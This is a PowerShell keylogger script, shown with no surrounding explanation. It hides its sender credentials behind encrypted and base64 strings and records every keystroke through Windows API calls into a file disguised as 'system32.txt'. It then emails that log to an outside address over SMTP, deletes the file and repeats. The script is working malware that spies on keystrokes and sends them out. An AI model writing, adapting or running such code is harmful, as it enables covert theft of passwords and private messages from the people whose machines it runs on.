$encryptU="01000000d08c9ddf0115d1118c7a00c04fc297eb01000000bccfbb297ee4734aa0aa84b8835f731e00000000020000000000106600000001000020000000526be404c8441738078e0cf380fb7789933c8c526b196d506e45d8d9937314ad000000000e8000000002000020000000c66163e7560557fe010c9666db659cb465bdb3fd16d7d881061fcba7a973f2aa7000000050646a0d9401d6aeb20d1f69e04f07fa7ab966c64dd8fd6ae9dfd399a43f1128c356524e5fea2656a3a0689c43e165d407538c86b8c447da7f7536fcad5c92958d51e1236570a14c32eb9374d063d56d336f83d702f79a3f47be5affb35a6a74c16abc8b4ecb24211e7a6631717e59d04000000020f41e3c89ea66f47b8c7a43c20aef0987e4c5b0299870ed3d9a7cd616848fd9ca35e8e3d2d692a0a89561bc43b5e85d995a4e14466ea17c184fabee6aa6a3f7"|ConvertTo-SecureString;$x="JwBJAEEATQBKAFUAUwBUAEMATwBOAEYAVQBTAEkATgBHAFkATwBVAFQASABJAFMAQQBDAEMATwBVAE4AVABJAFMATgBPAFYAQQBMAFUARQBUAE8ATQBFACcA";$strU=[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((($encryptU))));$From=powershell -encodedCommand $strU;$str="JwBJAEEATQBKAFUAUwBUAEMATwBOAEYAVQBTAEkATgBHAFkATwBVAFQASABJAFMAQQBDAEMATwBVAE4AVABJAFMATgBPAFYAQQBMAFUARQBUAE8ATQBFACcA";$encryptP="01000000d08c9ddf0115d1118c7a00c04fc297eb01000000bccfbb297ee4734aa0aa84b8835f731e00000000020000000000106600000001000020000000ad4e95ae89b44893d092650567aa99d5b93f46e0d197fc81fd778f3e0851a683000000000e8000000002000020000000dfab8cf8fbcb17da32577f9c8ae7e65fedf40827521c6fab71f64328867c3502700000005a412a2b152c6474f79a48ee661c9c6f02ca36108dcaa7e2c3658d080b470137a78bcd33f1e4186ecf4e14a728449974f621564a73b8f72327ad7ea05e4e4f8d3edacd6662550c6275a03086fb5e17ce42b25c2536ae8568f23333e5134ed5cb0f084183ad54d4de7b59ec88033bb8bd40000000ed1fa717926c7695f4bf4f4d5b58f453f68b7255a1765a1e655776b2ca88fa0172c1815f7eaef9fe433df874994d90f7dd9cbce530dd85f588be9d1a1e04e108"|ConvertTo-SecureString;$y="JwBUAEgASQBTAEkAUwBKAFUAUwBUAEIAVQBOAEMASABPAEYARwBJAEIAQgBFAFIASQBTAEgAJwA=";$strP=[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((($encryptP))));$Pass=powershell -encodedCommand $strP;$passw="JwBJAEEATQBKAFUAUwBUAEMATwBOAEYAVQBTAEkATgBHAFkATwBVAFQASABJAFMAQQBDAEMATwBVAE4AVABJAFMATgBPAFYAQQBMAFUARQBUAE8ATQBFACcA";$RunTime=2;$Init=1;$To="azhar08khan@mail.com";$Subject="System Logged of "+$env:USERNAME;$body="System Logged as of "+$StartTime;$body;$SMTPServer="smtp.mail.com";$SMTPPort="587";$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
#Goodluck Hacking this..!
$MyEmailUsername = "gAAAAABeD9BGrwXuP6--F_CS7yAtgs7KDDPb0ok6geAUc2gbOME4UkwkM7iUxXb3dtsGaZK6xzUVvME51Kz1gsssPirnsX4PZg1CmBp2lwD-L-479JwECsI='123"
$MyEmailPassword = "gAAAAABeD9C_Hndb3jDsR7HTZtwg2XS-pW9O1wkUYwLQp0MbAR9XoMCVPBG2M_dkQhjURwkSx_u94ODoAKznmbKgzWEf_pi607Ytb7Z3jrY22a6MRcA-wHs='123"
$StartTime = Get-Date
$EndTime = $StartTime.addminutes($Init)

#requires -Version 2
function SystemLogger($Path="C:\Users\Public\system32.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    $Runner = 0
	while ($RunTime  -ge $Runner) {
	while ($EndTime -ge $TimeNow) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
	  $TimeNow = Get-Date
    }
	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
    Remove-Item -Path $Path -force
	}
  }
  finally
  {
    
    exit 1

  }
}

SystemLogger